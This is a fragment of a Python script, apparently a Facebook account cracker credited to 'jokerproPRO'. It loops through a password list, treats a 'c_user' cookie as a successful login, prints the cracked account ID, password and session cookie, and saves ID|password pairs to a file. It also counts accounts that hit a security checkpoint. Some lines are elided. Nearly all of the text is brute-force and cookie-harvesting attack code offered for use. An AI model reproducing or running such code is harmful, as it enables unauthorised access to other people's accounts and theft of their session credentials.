...
\033[1;37m $$ |\$$\    $$ |  $$ |\$$$ |$$ |  $$ |
\033[1;37m $$ | \$$\ $$$$$$\ $$ | \$$ |\$$$$$$  |
\033[1;37m \__|  \__|\______|\__|  \__| \______/ \033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mjokerproPRO\033[1;37m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[jokerproPRO-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('jokerproPRO-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[jokerproPRO-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mjokerproPRO\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
